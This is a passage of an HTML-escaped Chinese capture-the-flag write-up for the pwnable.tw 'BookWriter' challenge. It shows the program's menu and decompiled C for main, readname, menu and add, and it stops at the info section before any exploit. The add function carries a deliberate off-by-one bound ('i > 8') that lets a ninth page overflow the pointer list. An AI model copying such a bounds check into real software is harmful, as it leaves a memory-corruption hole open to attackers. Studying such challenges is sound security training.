&lt;h2 id=&#34;主要代码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#主要代码&#34;&gt;#&lt;/a&gt; 主要代码：&lt;/h2&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;giantbranch@ubuntu:~/Desktop/pwnabletw/BookWriter$ ./bookwriter &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Welcome to the BookWriter !&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Author :qqqqqqqqqqq&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;----------------------&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      BookWriter      &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;----------------------&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;1.&lt;/span&gt; Add a page        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;2.&lt;/span&gt; View a page       &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;3.&lt;/span&gt; Edit a page       &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;4.&lt;/span&gt; Information       &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;5.&lt;/span&gt; Exit              &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;----------------------&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your choice :^C&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;main函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#main函数&#34;&gt;#&lt;/a&gt; main 函数&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; __fastcall &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a1, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **a2, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **a3)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  setvbuf(&lt;span class=&#34;built_in&#34;&gt;stdout&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Welcome to the BookWriter !&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  readname();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    menu();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;switch&lt;/span&gt; ( getnum() )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        add();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2LL&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        info();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;3LL&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        edit();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;4LL&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        updatename();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;5LL&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;default&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Invalid choice&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;readname函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#readname函数&#34;&gt;#&lt;/a&gt; readname 函数&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__int64 &lt;span class=&#34;title function_&#34;&gt;sub_400BDF&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Author :&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; readck(&amp;amp;auther, &lt;span class=&#34;number&#34;&gt;64LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__int64 __fastcall &lt;span class=&#34;title function_&#34;&gt;readck&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(__int64 a1, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a2)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; len; &lt;span class=&#34;comment&#34;&gt;// [rsp+1Ch] [rbp-4h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  len = _read_chk(&lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;, a1, a2, a2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( len &amp;lt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;read error&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( *(_BYTE *)(len - &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt; + a1) == &lt;span class=&#34;string&#34;&gt;&amp;#x27;\n&amp;#x27;&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    *(_BYTE *)(len - &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt; + a1) = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)len;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;menu函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#menu函数&#34;&gt;#&lt;/a&gt; menu 函数&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;----------------------&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;      BookWriter      &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;----------------------&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot; 1. Add a page        &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot; 2. View a page       &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot; 3. Edit a page       &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot; 4. Information       &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot; 5. Exit              &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;----------------------&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Your choice :&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;add函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#add函数&#34;&gt;#&lt;/a&gt; add 函数&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i; &lt;span class=&#34;comment&#34;&gt;// [rsp+Ch] [rbp-14h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *v2; &lt;span class=&#34;comment&#34;&gt;// [rsp+10h] [rbp-10h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 size; &lt;span class=&#34;comment&#34;&gt;// [rsp+18h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ( i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; ; ++i )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( i &amp;gt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;You can&amp;#x27;t add new page anymore!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !(&amp;amp;ptrlist)[i] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Size of page :&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  size = getnum();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v2 = (&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)&lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !v2 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Error !&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Content :&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  readck((__int64)v2, size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  (&amp;amp;ptrlist)[i] = v2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sizelist[i] = size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ++count;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Done !&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;info函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#info函数&#34;&gt;#&lt;/a&gt; info 函数&lt;/h3&gt;
